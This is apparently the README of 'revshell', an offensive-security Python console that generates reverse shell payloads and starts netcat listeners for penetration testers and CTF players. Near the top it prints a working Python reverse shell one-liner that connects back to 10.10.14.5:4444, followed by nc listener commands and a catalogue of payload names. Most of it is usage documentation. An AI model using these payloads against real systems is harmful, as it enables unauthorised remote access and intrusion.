<div align="center">

```
                           _            .x+=:.                                ..       .. 
                          u            z`    ^%    .uef^"               x .d88"  x .d88"  
   .u    .               88Nu.   u.       .   <k :d88E                   5888R    5888R   
 .d88B :@8c       .u    '88888.o888c    .@8Ned8" `888E            .u     '888R    '888R   
="8888f8888r   ud8888.   ^8888  8888  .@^%8888"   888E .z8k    ud8888.    888R     888R   
  4888>'88"  :888'8888.   8888  8888 x88:  `)8b.  888E~?888L :888'8888.   888R     888R   
  4888> '    d888 '88%"   8888  8888 8888N=*8888  888E  888E d888 '88%"   888R     888R   
  4888>      8888.+"      8888  8888  %8"    R88  888E  888E 8888.+"      888R     888R   
 .d888L .+   8888L       .8888b.888P   @8Wou 9%   888E  888E 8888L        888R     888R   
 ^"8888*"    '8888c. .+   ^Y8888*""  .888888P`    888E  888E '8888c. .+  .888B .  .888B . 
    "Y"       "88888%       `Y"      `   ^"F     m888N= 888>  "88888%    ^*888%   ^*888%  
                "YP'                              `Y"   888     "YP'       "%       "%    
                                                       J88"                               
                                                       @%                                 
                                                     :"                                   
```

**Interactive reverse shell generator console — msfconsole-style**

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776ab?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey?style=flat-square&logo=linux)](https://github.com)
[![License](https://img.shields.io/badge/License-MIT-22c55e?style=flat-square)](LICENSE)
[![Version](https://img.shields.io/badge/Version-v2.1-red?style=flat-square)](https://github.com/ZetaOrioniss/revshell)
[![Payloads](https://img.shields.io/badge/Payloads-Invicti-ef4444?style=flat-square)](https://www.invicti.com)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/ZetaOrioniss/revshell/pulls)

[Features](#-features) · [Why revshell?](#-why-revshell) · [Install](#-installation) · [Usage](#-usage) · [CLI Arguments](#-cli-arguments) · [Commands](#-commands) · [Interfaces](#-network-interface-picker) · [Payloads](#-available-payloads) · [FAQ](#-faq)

</div>

---

## What is revshell?

**revshell** is an interactive terminal console for generating reverse shell payloads, built for penetration testers and CTF players. Inspired by the `msfconsole` workflow, it lets you configure your LHOST and LPORT once — then generate any payload instantly, start a real listener, and manage everything from a single persistent session.

v2.0 adds a full **CLI argument interface**: every action the console exposes can now be triggered non-interactively from the command line — generate a payload and pipe it directly to `xclip`, filter by category, start a listener, or just list keys, all without entering the REPL.

```
revshell (10.10.14.5:4444) > use python3_pty

  ────────────────────────────────────────────────────────────────────────────
  🐧 Python3 PTY  python3_pty  (unix/python)
  Spawns a PTY
  ────────────────────────────────────────────────────────────────────────────

  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));
  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

  Listener:  nc -lvnp 4444
```

---

## ✨ Features

| | Feature | Detail |
|---|---|---|
| 🖥️ | **Interactive REPL console** | Persistent session — set your config once, generate any payload instantly |
| 🐚 | **Automated shell upgrade** | Detect availables dependencies on the target and upgrade the shell automatically |
| 🔴 | **Dynamic prompt** | Always shows current `IP:PORT` — never lose track of your session state |
| 🌐 | **Interface-aware LHOST** | Set LHOST from an interface name (`tun0`, `eth0`) — IP is resolved automatically |
| 🖱️ | **Interactive interface picker** | `ifconfig pick` displays a numbered list — select by number or name |
| ⚠️ | **Visual placeholders** | Unset values appear in red `<LHOST>` / `<LPORT>` — no more broken payloads |
| 🔀 | **50+ payloads** | Bash, Python, Perl, PHP, Ruby, Netcat, Socat, AWK, Go, Lua, Node.js, PowerShell, Meterpreter stagers |
| 🐧🪟 | **Platform filtering** | `run --unix` / `run --windows` to filter by OS |
| 🗂️ | **Category filtering** | `run --cat python` to show only a specific language |
| 📡 | **Real listener** | `listener` and `rlwrap` start an actual `nc -lvnp` session from inside the console |
| ⚡ | **CLI one-shot mode** | Pass `-H`, `-P`, `-u`, `--all`, `--list`, `--listen`… to run without entering the REPL |
| 📋 | **Pipe-friendly `--raw`** | `--raw` outputs the bare command with no colors — perfect for piping to `xclip` or `pbcopy` |
| 🔍 | **Netcat auto-detection** | Checks for `nc`, `ncat`, `netcat` — gives clear install hint if missing |
| 💾 | **Persistent config** | LHOST and LPORT saved to `conf.json` — reload anytime with `load config` |
| ⌨️ | **Tab completion** | Commands, keys, payload names, and interface names all autocomplete |
| 📖 | **Command history** | Navigate previous commands with arrow keys |
| 📦 | **Zero dependencies** | Pure Python standard library — nothing to install beyond Python 3.10 |

---

## 💡 Why revshell?

The typical CTF flow for getting a reverse shell looks like this:

1. Run `ip a` in a separate terminal to find your VPN IP
2. Open a browser / grep your notes for the right payload
3. Copy it, manually replace the IP and port
4. Open another terminal for the listener
5. Repeat every time you pivot to a new machine

**revshell collapses all of that into one place.** Type `ifconfig pick`, select `tun0`, and your LHOST is set. Every payload is pre-filled. Your listener starts in the same window with a single command. The config persists across sessions.

With v2.0 you don't even need to enter the console — a single command in your terminal gets you the payload, ready to paste or pipe.

### Compared to alternatives

| | revshell | revshells.com | msfconsole | grep from notes |
|---|:---:|:---:|:---:|:---:|
| Works offline | ✅ | ❌ | ✅ | ✅ |
| No dependencies | ✅ | ✅ | ❌ | ✅ |
| Set IP from interface name | ✅ | ❌ | ✅ | ❌ |
| Real listener built-in | ✅ | ❌ | ✅ | ❌ |
| Persistent config | ✅ | ❌ | ✅ | ❌ |
| Tab completion | ✅ | ❌ | ✅ | ❌ |
| CLI non-interactive mode | ✅ | ❌ | ❌ | ❌ |
| Pipe-friendly raw output | ✅ | ❌ | ❌ | ❌ |
| Lightweight / single file | ✅ | ✅ | ❌ | ✅ |

---

## 📦 Installation

No pip, no virtualenv, no setup. Python 3.10+ is the only requirement.

```bash
git clone https://github.com/ZetaOrioniss/revshell.git
cd revshell
chmod +x revshell.py
```

**Optional — install system-wide:**

```bash
sudo cp revshell.py /usr/local/bin/revshell
```

**Optional dependencies** (for the listener):

```bash
sudo apt install netcat-openbsd   # listener
sudo apt install rlwrap           # upgraded TTY on listener
```

---

## 🚀 Usage

```bash
python3 revshell.py              # interactive console
python3 revshell.py --help       # CLI argument reference
```

### Typical CTF workflow

```
# Option A — set IP from interface (tun0, eth0, etc.)
revshell (-:-) > set ip tun0
  LHOST => 10.10.14.5  (resolved from interface tun0)

# Option B — interactive picker
revshell (-:-) > ifconfig pick
  #   INTERFACE    IPv4
  1.  eth0         192.168.1.42
  2.  tun0         10.10.14.5
  > 2
  LHOST => 10.10.14.5  (tun0)

# Set port and generate payloads
revshell (10.10.14.5:-) > set port 4444
revshell (10.10.14.5:4444) > run              ← all payloads
revshell (10.10.14.5:4444) > use bash_tcp     ← one payload
revshell (10.10.14.5:4444) > run --windows    ← Windows only
revshell (10.10.14.5:4444) > run --cat python ← Python only
revshell (10.10.14.5:4444) > listener         ← nc -lvnp 4444
revshell (10.10.14.5:4444) > rlwrap           ← rlwrap nc -lvnp 4444

# Save and reload config
revshell (10.10.14.5:4444) > load config      ← restore from conf.json
```

---

## ⚡ CLI Arguments

v2.0 adds a complete non-interactive CLI. Any action available in the console can now be run from a single command, with no REPL required.

```
usage: revshell [-h] [-H LHOST] [-P LPORT] [-u KEY] [--all] [--list] [--raw]
                [--unix] [--windows] [--cat CATEGORY] [--listen] [--rlwrap]
                [--ifconfig] [--no-banner]
```

### Connection

| Argument | Description |
|---|---|
| `-H`, `--host LHOST` | Attacker IP or interface name (e.g. `10.10.14.5`, `tun0`, `eth0`) |
| `-P`, `--port LPORT` | Listener port (e.g. `4444`) |

When used without a non-interactive flag, `-H` and `-P` pre-seed the console session — you land in the REPL with LHOST and LPORT already set.

### One-shot output

| Argument | Description |
|---|---|
| `-u`, `--use KEY` | Print a single payload by key and exit |
| `--all` | Print all payloads and exit (respects `--unix`/`--windows`/`--cat`) |
| `--list` | List all payload keys and names in table view and exit |
| `--raw` | With `-u`: output bare command only — no colors, no decoration. Pipe-friendly. |

### Filters

| Argument | Description |
|---|---|
| `--unix` | Show Unix/Linux payloads only |
| `--windows` | Show Windows payloads only |
| `--cat CATEGORY` | Filter by category: `bash`, `python`, `perl`, `php`, `ruby`, `netcat`, `socat`, `other`, `powershell`, `meterpreter` |

### Listener

| Argument | Description |
|---|---|
| `--listen` | Start `nc -lvnp <LPORT>` and exit (requires `-P`) |
| `--rlwrap` | Start `rlwrap nc -lvnp <LPORT>` and exit (requires `-P`) |

### Misc

| Argument | Description |
|---|---|
| `--ifconfig` | List IPv4 interfaces and exit |
| `--no-banner` | Suppress the banner when launching the interactive console |

### Examples

```bash
# Print one payload and exit
revshell.py -H 10.10.14.5 -P 4444 -u bash_tcp

# Copy a payload directly to clipboard — no terminal noise
revshell.py -H 10.10.14.5 -P 4444 -u socat --raw | xclip -sel clip

# Print all Unix Python payloads
revshell.py -H 10.10.14.5 -P 4444 --all --unix --cat python

# List all available payload keys
revshell.py --list

# List netcat payloads only
revshell.py --list --cat netcat

# Resolve an interface name to IP, print a payload, and exit
revshell.py -H tun0 -P 4444 -u socat --raw

# Start a listener directly
revshell.py -P 4444 --listen
revshell.py -P 4444 --rlwrap

# Launch the console with LHOST/LPORT pre-configured, no banner
revshell.py -H 10.10.14.5 -P 4444 --no-banner
```

---

## 📋 Commands

### Configuration

| Command | Description |
|---|---|
| `set ip <address\|iface>` | Set LHOST — accepts a raw IP **or** an interface name (`tun0`, `eth0`…) |
| `set port <port>` | Set LPORT — also accepts `set lport` |
| `unset ip` | Clear LHOST |
| `unset port` | Clear LPORT |
| `show options` | Display current LHOST and LPORT |
| `load config` | Reload LHOST and LPORT from `conf.json` |

### Network Interfaces

| Command | Description |
|---|---|
| `ifconfig` / `interfaces` | List all IPv4 interfaces |
| `ifconfig pick` | Interactive numbered picker — sets LHOST on selection |
| `ifconfig <name>` | Show all interfaces, highlighting the named one |

### Payloads

| Command | Description |
|---|---|
| `show` | List all payload keys and platforms |
| `show <category>` | Filter list by category (e.g. `show python`) |
| `use <key>` | Display a single payload (e.g. `use bash_tcp`) |
| `run` / `generate` | Display all payloads with current config |
| `run <key>` | Display a specific payload |
| `run --unix` / `-u` | Show Unix payloads only |
| `run --windows` / `-w` | Show Windows payloads only |
| `run --cat <name>` | Show payloads for a specific category |

### Listener

| Command | Description |
|---|---|
| `listener` | Start `nc -lvnp <LPORT>` — binary auto-detected |
| `rlwrap` | Start `rlwrap nc -lvnp <LPORT>` for upgraded TTY |

### Shell

| Command | Description |
|---|---|
| `! <command>` | Execute a native system command from inside the console |
| `shell` | Drop into an interactive `/bin/bash` subshell |

### Other

| Command | Description |
|---|---|
| `clear` | Clear the screen and reprint the banner |
| `help` | Show the full command reference |
| `exit` / `quit` | Exit the console |

---

## 🌐 Network Interface Picker

One of the most tedious parts of a CTF is finding your VPN IP before generating payloads. revshell solves this with three methods:

**Method 1 — set directly from interface name:**
```
revshell (-:-) > set ip tun0
  LHOST => 10.10.14.5  (resolved from interface tun0)
```

Tab-complete works here too — pressing Tab after `set ip ` will suggest available interface names.

**Method 2 — interactive picker:**
```
revshell (-:-) > ifconfig pick

  #   INTERFACE    IPv4
  ────────────────────────────────────────────────────
  1.  eth0         192.168.1.42
  2.  tun0         10.10.14.5
  ────────────────────────────────────────────────────
  Enter number or interface name (empty to cancel):
  > 2
  LHOST => 10.10.14.5  (tun0)
```

**Method 3 — browse interfaces first, then decide:**
```
revshell (-:-) > ifconfig

  INTERFACE    IPv4
  eth0         192.168.1.42
  tun0         10.10.14.5

  Tip: ifconfig pick to interactively set LHOST
  Tip: set ip <iface> to set LHOST from an interface name
```

**Method 4 — from the CLI directly (v2.0):**
```bash
revshell.py -H tun0 -P 4444 -u bash_tcp --raw
# → resolves tun0 to 10.10.14.5 and prints the payload
```

IP resolution uses three fallback methods internally (`fcntl` ioctl → `ip -4 addr` → `ifconfig`) to work across Linux distributions and macOS.

---

## 💾 Persistent Config

revshell saves LHOST and LPORT to a `conf.json` file in the current directory every time you use `set`. On your next session, restore them with a single command:

```
revshell (-:-) > load config
  LHOST loaded from config: 10.10.14.5
  LPORT loaded from config: 4444
```

`conf.json` format:
```json
{
    "param": {
        "host": "10.10.14.5",
        "port": "4444"
    }
}
```

---

## 🔀 Available Payloads

| Key | Name | Platform | Category |
|---|---|---|---|
| `bash_tcp` | Bash TCP | 🐧 Unix | bash |
| `bash_196` | Bash FD 196 | 🐧 Unix | bash |
| `bash_udp` | Bash UDP | 🐧 Unix | bash |
| `bash_read` | Bash read loop | 🐧 Unix | bash |
| `sh_tcp` | sh TCP | 🐧 Unix | bash |
| `zsh_tcp` | Zsh TCP | 🐧 Unix | bash |
| `python3_pty` | Python3 PTY | 🐧 Unix | python |
| `python3_env` | Python3 environ | 🐧 Unix | python |
| `python3_thread` | Python3 threaded | 🐧 Unix | python |
| `python2` | Python2 | 🐧 Unix | python |
| `python_win` | Python Windows | 🪟 Windows | python |
| `perl` | Perl | 🐧 Unix | perl |
| `perl_no_sh` | Perl no /bin/sh | 🐧 Unix | perl |
| `perl_win` | Perl Windows | 🪟 Windows | perl |
| `php_exec` | PHP exec | 🐧 Unix | php |
| `php_proc_open` | PHP proc_open | 🐧 Unix | php |
| `php_shell_exec` | PHP shell_exec | 🐧 Unix | php |
| `php_system` | PHP system() | 🐧 Unix | php |
| `php_passthru` | PHP passthru() | 🐧 Unix | php |
| `php_win` | PHP Windows | 🪟 Windows | php |
| `ruby` | Ruby | 🐧 Unix | ruby |
| `ruby_no_sh` | Ruby no /bin/sh | 🐧 Unix | ruby |
| `ruby_win` | Ruby Windows | 🪟 Windows | ruby |
| `nc_e` | Netcat -e | 🐧 Unix | netcat |
| `nc_mkfifo` | Netcat mkfifo | 🐧 Unix | netcat |
| `nc_ncat` | Ncat | 🐧 Unix | netcat |
| `nc_udp` | Netcat UDP | 🐧 Unix | netcat |
| `busybox_nc` | BusyBox nc | 🐧 Unix | netcat |
| `socat` | Socat | 🐧 Unix | socat |
| `socat_tty` | Socat encrypted | 🐧 Unix | socat |
| `socat_udp` | Socat UDP | 🐧 Unix | socat |
| `awk` | AWK | 🐧 Unix | other |
| `gawk` | GNU Awk | 🐧 Unix | other |
| `telnet` | Telnet mkfifo | 🐧 Unix | other |
| `lua` | Lua | 🐧 Unix | other |
| `golang` | Go | 🐧 Unix | other |
| `java_runtime` | Java Runtime | 🐧 Unix | other |
| `node_js` | Node.js | 🐧 Unix | other |
| `powershell` | PowerShell TCP | 🪟 Windows | powershell |
| `ps_oneliner` | PowerShell one-liner | 🪟 Windows | powershell |
| `ps_b64` | PowerShell Base64 | 🪟 Windows | powershell |
| `ps_icm` | PowerShell ICM | 🪟 Windows | powershell |
| `ps_nishang` | Nishang Invoke-PowerShellTcp | 🪟 Windows | powershell |
| `cmd_nc` | cmd.exe + nc | 🪟 Windows | powershell |
| `msf_linux_x64` | MSF Linux x64 | 🐧 Unix | meterpreter |
| `msf_win_x64` | MSF Windows x64 | 🪟 Windows | meterpreter |
| `msf_ps_stager` | MSF PS stager | 🪟 Windows | meterpreter |
| `msf_handler` | MSF handler | 🌐 Both | meterpreter |

Payloads sourced from [Invicti](https://www.invicti.com).

---

## ❓ FAQ

**Can I use an interface name instead of an IP?**
Yes — `set ip tun0` resolves the interface's IPv4 address automatically. Interface names also autocomplete with Tab. The CLI also accepts interface names via `-H tun0`.

**What if my interface has no IPv4 (e.g. IPv6 only)?**
revshell will tell you the interface was not found or has no IPv4 address, and suggest running `ifconfig` to check.

**Where is conf.json saved?**
In the current working directory when you launch `revshell.py`. Move the file or symlink it if you want a shared config across locations.

**What if netcat is not installed?**
The `listener` and `rlwrap` commands will tell you which package to install (`sudo apt install netcat-openbsd`). Payload generation works without netcat.

**Can I run it on Windows?**
The core logic works on Windows with Python 3.10+. The interface picker relies on Linux/macOS system calls and will fall back gracefully, though results may be incomplete. `readline` may require `pyreadline3` on Windows (`pip install pyreadline3`).

**Does it save my payloads?**
It saves LHOST and LPORT to `conf.json`. Individual payloads are generated on the fly — copy them directly from the terminal output, or use `--raw` to pipe them anywhere.

**How do I copy a payload to clipboard without entering the console?**
```bash
revshell.py -H tun0 -P 4444 -u bash_tcp --raw | xclip -sel clip   # Linux
revshell.py -H tun0 -P 4444 -u bash_tcp --raw | pbcopy             # macOS
```

---

## ⚠️ Disclaimer

This tool is intended **for authorized penetration testing, CTF competitions, and educational purposes only**.

The author is not responsible for any misuse or damage caused by this program. Always obtain proper **written authorization** before testing systems you do not own. Unauthorized use of reverse shells against systems without consent is **illegal**.

---

<div align="center">

Payloads sourced from [Invicti](https://www.invicti.com) &nbsp;•&nbsp; Built for the terminal &nbsp;•&nbsp; by [@ZetaOrioniss](https://github.com/ZetaOrioniss)

</div>
